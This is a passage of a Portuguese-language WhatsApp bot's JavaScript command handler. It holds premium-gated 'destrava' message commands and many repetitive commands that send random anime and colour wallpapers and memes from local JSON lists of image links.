                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava9': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebutte = [
                    {buttonId: `/destrava10`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava9}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseebutte,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava10': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseebutee = [
                    {buttonId: `/destrava11`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava10}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseebutee,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava11': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseeebute = [
                    {buttonId: `/destrava12`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava11}`,
                    footer: '¬© Copyright by Yuri Modz_',
                    buttons: buttonseeebute,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava12': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buuttonseeebute = [
                    {buttonId: `/destrava13`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava12}`,
                    footer: '¬©  _Copyright by Yuri Modz__',
                    buttons: buuttonseeebute,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

case 'destrava13': {
if (!isPremium && !isGroupAdmins) return reply(enviar.msg.premium)
                let buttonseeebuttte = [
                    {buttonId: `/limpar`, buttonText: {displayText: 'Proxima destrava'}, type: 1}
                ]
                let buttonMessagee = {
                    text: `${destrava13}`,
                    footer: '¬©  _Copyright by Yuri Modz__',
                    buttons: buttonseeebuttte,
                    headerType: 2
                }
                pl.sendMessage(m.chat, buttonMessagee, {quoted: selo})
            }
            break

//============== WALLPEPER ============\\


case 'menuwall': case 'menuwallpaper': {
	timestampe = speed();
latensie = speed() - timestampe
uptime = process.uptime()
sections = [
{
title: "ESCOLHA UMA DA LISTA",
rows: [
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêíùêáùêàùêçùêéùêÅùêî [ü©∏]", rowId: `${prefix}wallpapershinobu`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêéùêÅùêÄùêçùêÄùêà [ü©∏]", rowId: `${prefix}wallpaperobanai`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÜùêòùêîùêìùêÄùêëùêé [ü©∏]", rowId: `${prefix}wallpapergyutaro`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÄùêéùêà [ü©∏]", rowId: `${prefix}wallpaperaoi`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêìùêéùêåùêàùêéùêäùêÄ [ü©∏]", rowId: `${prefix}wallpapertomioka`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêåùêàùêìùêíùêîùêëùêà [ü©∏]", rowId: `${prefix}wallpapermitsuri`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÉùêÄùêäùêà [ü©∏]", rowId: `${prefix}wallpaperdaki`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêäùêÄùêçùêÄùêé [ü©∏]", rowId: `${prefix}wallpaperkanao`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÜùêòùêÑùêçùêàùêÄ [ü©∏]", rowId: `${prefix}wallpapergyenia`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêìùêÄùêåùêÄùêòùêé [ü©∏]", rowId: `${prefix}wallpapertamayo`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÉùêéùêîùêåùêÄ [ü©∏]", rowId: `${prefix}wallpaperdouma`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêíùêÄùêçùêÑùêåùêà [ü©∏]", rowId: `${prefix}wallpapersanemi`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêìùêéùêäùêàùêìùêé [ü©∏]", rowId: `${prefix}wallpapertokito`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêçùêÑùêôùêîùêäùêé [ü©∏]", rowId: `${prefix}wallpapernezuko`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÑùêçùêåùêî [ü©∏]", rowId: `${prefix}wallpaperenmu`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêàùêçùêéùêíùêîùêäùêÑ [ü©∏]", rowId: `${prefix}wallpaperinosuke`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêåùêîùêôùêÄùêç [ü©∏]", rowId: `${prefix}wallpaparmuzan`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêäùêéùêäùêîùêíùêáùêàùêÅùêéùêî [ü©∏]", rowId: `${prefix}wallpaperkokushibou`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêôùêÑùêçùêàùêìùêíùêî [ü©∏]", rowId: `${prefix}wallpaperzenitsu`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêìùêÄùêçùêâùêàùêëùêé [ü©∏]", rowId: `${prefix}wallpapertanjiro`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÄùêäùêÄùêôùêÄ [ü©∏]", rowId: `${prefix}wallpaperakaza`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÜùêòùêéùêåùêÑùêà [ü©∏]", rowId: `${prefix}wallpapergyomei`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêäùêòùêéùêçùêâùêîùêëùêé [ü©∏]", rowId: `${prefix}wallpaperkyonjuro`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÄùêåùêÄùêëùêÑùêãùêé [ü©∏]", rowId: `${prefix}wallpaperamarelo`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÄùêçùêàùêåùêÑùêí [ü©∏]", rowId: `${prefix}wallpaperanimes`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÄùêôùêîùêã [ü©∏]", rowId: `${prefix}wallpaperazul`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÉùêÄùêëùêä [ü©∏]", rowId: `${prefix}wallpaperdark`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêëùêéùêíùêÄ [ü©∏]", rowId: `${prefix}wallpaperrosa`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêëùêéùêóùêé [ü©∏]", rowId: `${prefix}wallpaperroxo`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë 4ùêä [ü©∏]", rowId: `${prefix}wallpapers4k`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêÅùêëùêÄùêçùêÇùêé [ü©∏]", rowId: `${prefix}wallpaperbranco`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêïùêÑùêëùêÉùêÑ [ü©∏]", rowId: `${prefix}wallpaperverde`},
{title: "[ü©∏] ùêñùêÄùêãùêãùêèùêÄùêèùêÑùêë ùêïùêÑùêëùêåùêÑùêãùêáùêé [ü©∏]", rowId: `${prefix}wallpapervermelho`}
]
},
]
 

const listMessage2 = {
text: `
ùêåùêÑùêçùêî ùêñùêÄùêãùêãùêèùêÑùêèùêÑùêë`,
  footer: `¬© Copyright By Yuri Modz`,
  title: ``,
  buttonText: "[ü©∏] ùêÇùêãùêàùêêùêîùêÑ ùêÄùêêùêîùêà [ü©∏]",
  sections
}
pl.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'wallpapers4k': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpapers4k.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapers4k`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperdark': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperdark.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperdark`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperanimes': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperanimes.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperanimes`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperbranco': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpapersbranco.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapersbranco`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break
l
case 'wallpapervermelho': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpapervermelho.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapervermelho`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperverde': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperverde.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperverde`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperazul': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperazul.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperazul`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperroxo': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperoxo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperoxo`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperamarelo': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperamarelo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperamarelo`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperrosa': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/wallpaperosa.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperrosa`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://telegra.ph/file/0e2989e6947b464fa66b8.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© _Copyright By Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'outroshitpost':
reply(`„Äé‚ùó„Äè${command} enviado no seu pv`)
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/memes/outroshitpost.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
pl.sendMessage(m.sender, {image: imagem, caption: `aqui est√° o seu ${command} ${pushname}\n\ngostou?` },{quoted: selo})
break

case 'memesdasam':
reply(`„Äé‚ùó„Äè${command} enviado no seu pv`)
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/memes/memesdasam.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
pl.sendMessage(m.sender, {image: imagem, caption: `aqui est√° o seu ${command} ${pushname}\n\ngostou?` },{quoted: selo})
break

case 'shitpost':
reply(`„Äé‚ùó„Äè${command} enviado no seu pv`)
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/memes/shitpost.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
pl.sendMessage(m.sender, {image: imagem, caption: `aqui est√° o seu ${command} ${pushname}\n\ngostou?` },{quoted: selo})
break

case 'wallpapershinobu': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/shinobu.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapershinobu`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/SHINOBU/fb10ed54c286b52d7e5f22f5b465274c.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperobanai': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/obanai.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperobanai`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/OBANAI/f437d7615e55a1804f637f7151769ee9.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapergyutaro': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/gyutaro.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapergyutaro`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/GYUTARO/fdcde69d36595bfd6b7671adcd510761.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperaoi': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/aoi.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperaoi`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/AOI/ffd8282a82aece8ce698a343a0790f3d.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapertomioka': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/tomioka.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertomioka`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TOMIOKA/f9572e842eb8b67f089c259459394b35.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperuzui': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/uzui.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperuzui`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/UZUI/f67c5a0a822808ac770ad49472ccc14f.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapermitsuri': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/mitsuri.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapermitsuri`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/MITSURI/fd16399b5c80072c8deee4f87bf5993e.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperdaki': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/daki.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperdaki`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/DAKI/fb8d18f68edd43d1ef752337784cf98f.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperkanao': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/kanao.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpaperkanao`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/KANAO/fbe10876319abaabc0a63f53f2121904.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapergyenia': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/gyenia.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapergyenia`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/GYENIA/fe251cb53add17e1aa7509d59d8490f9.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpapertamayo': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/tamayo.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`aqui est√° o seu ${command} ${pushname}`]
var zaltin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
imagem = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}wallpapertamayo`, buttonText: {displayText: '[ü©∏] ùêèùêëùêéÃÅùêóùêàùêåùêé [ü©∏]'}, type: 1}]
let thumbInfo = `${zaltin}`;
blabla = await getBuffer(`https://github.com/TomiokaNet/WALLPAPER/raw/main/TAMAYO/ffb690c3d847c4e7bd539b5bd81d2271.jpg`);
buttonMessage = {image: imagem, caption: `${thumbInfo}`, 
footer: `¬© Copyright by Yuri Modz`
, buttons: buttons, headerType: 4}
pl.sendMessage(m.chat, buttonMessage,{quoted: selo})
}
break

case 'wallpaperdouma': {
//by Mandrake >\<
data = fs.readFileSync('./fun√ß√µes de cmd/imgs/wallpapers/douma.js');
